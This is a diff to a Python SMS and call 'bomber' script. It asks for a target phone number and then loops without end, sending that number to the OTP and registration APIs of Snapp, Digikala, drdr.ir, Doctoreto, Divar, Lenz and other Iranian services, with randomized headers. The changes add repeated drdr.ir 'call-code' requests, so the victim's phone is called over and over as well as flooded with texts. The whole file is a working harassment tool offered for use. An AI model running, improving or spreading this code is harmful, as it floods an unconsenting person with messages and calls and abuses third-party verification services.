@@ -1,6 +1,6 @@
 import time
 import requests 
-#SmsBomber_Erfan_Tavana
+# import resource 
 import random
 from colorama import Fore as color  
 import os
@@ -37,12 +37,15 @@ heads = [
     },
 ]
 print("")
-number = input(color.GREEN+" Entrez votre nombre cible : "+color.MAGENTA+"( 9057767099 )  ")
-if number.index("0") == 0 :
-    while number.index("0") == 0 :     
-        print(color.RED+"It should not have zero")
-        number = input(color.GREEN+" Entrez votre nombre cible : "+color.MAGENTA+"( 9057767099 )  ")
-
+number = str(input(color.GREEN+" Enter the target number without 0: "+color.MAGENTA+"( 9057767099 )"))
+try:
+    if number.index("0") == 0 :
+        while number.index("0") == 0 :
+            print(color.RED+"It should not have zero")
+            number = input(color.GREEN+" Enter the target number without 0: "+color.MAGENTA+"( 9057767099 )  ")
+except :
+    pass
+rund = 0
 numb = 0
 os.system("cls")
 while True :
@@ -78,10 +81,19 @@ while True :
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"DoktorDoktor--- NOT ---SENT",color.GREEN+f"{numb}")
 
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
+
+
+
+
     #snap
     snap_number = {"cellphone":f"+98{number}"}
     snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-    #SmsBomber_Erfan_Tavana
     rhead = random.choice(heads)
     req_snap = requests.post(snap,json=snap_number,headers=rhead)
     if req_snap.status_code == 200 :
@@ -94,12 +106,19 @@ while True :
     else:
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
+    
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #دیجی کالا
+
     rhead = random.choice(heads)
     digi_number = {"backUrl":"/","username":number,"otp_call":"false"}
     digi = "https://api.digikala.com/v1/user/authenticate/"
     req_digi = requests.post(digi,json=digi_number,headers=rhead)
-    #SmsBomber_Erfan_Tavana
     if req_digi.status_code == 200 :
         time.sleep(2)
 
@@ -109,10 +128,10 @@ while True :
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Digikala--- NOT ---SENT",color.GREEN+f"{numb}")
 
+
     #snap
     snap_number = {"cellphone":f"+98{number}"}
     snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-    #SmsBomber_Erfan_Tavana
     rhead = random.choice(heads)
     req_snap = requests.post(snap,json=snap_number,headers=rhead)
     if req_snap.status_code == 200 :
@@ -138,8 +157,13 @@ while True :
     else:
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Namava--- NOT ---SENT",color.GREEN+f"{numb}")
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #snap
-    # عرفان توانا
     snap_number = {"cellphone":f"+98{number}"}
     snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
     rhead = random.choice(heads)
@@ -166,6 +190,12 @@ while True :
     else:
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Divar--- NOT ---SENT",color.GREEN+f"{numb}")
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #lenz 
     lenz_number = {"msisdn":f"98{number}"}
     lenz = "https://api-v3.lenz.ir/api/v3/user-management/otp/register"
@@ -204,6 +234,12 @@ while True :
         print(color.GREEN+"Mamdik---SENT",color.RED+f"{numb}")
     else :
         print(color.RED+"Mamdik--- NOT ---SENT",color.GREEN+f"{numb}")
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #snap
     snap_number = {"cellphone":f"+98{number}"}
     snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
@@ -262,6 +298,12 @@ while True :
     else:
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #دکتر تو 
     doktorto_number = {"mobile":number,"country_id":205}
     doktorto = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
@@ -274,6 +316,12 @@ while True :
     else : 
         print(color.RED+"Doktorto--- NOT ---SENT",color.GREEN+f"{numb}")
     #
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #snap
     snap_number = {"cellphone":f"+98{number}"}
     snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
@@ -315,9 +363,14 @@ while True :
     else:
         winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
         print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
-    
+    # تماس دکتر دکتر
+    doktor_number_c = {"phoneNumber":f"{number}","userType":"PATIENT"}
+    doktor_c = 'https://drdr.ir/api/registerEnrollment/register/call-code'
+    req_doktor_c = requests.post(doktor_c,json=doktor_number_c,headers=rhead)
+    numb += 1
+    print(color.GREEN+"DoktorDoktor---- CALL---SENT",color.RED+f"{numb}")
     #slip 
-    rund = 0
+    
     rund += 1
     print(f"finish rund {rund}")
     winsound.Beep(500, 500)
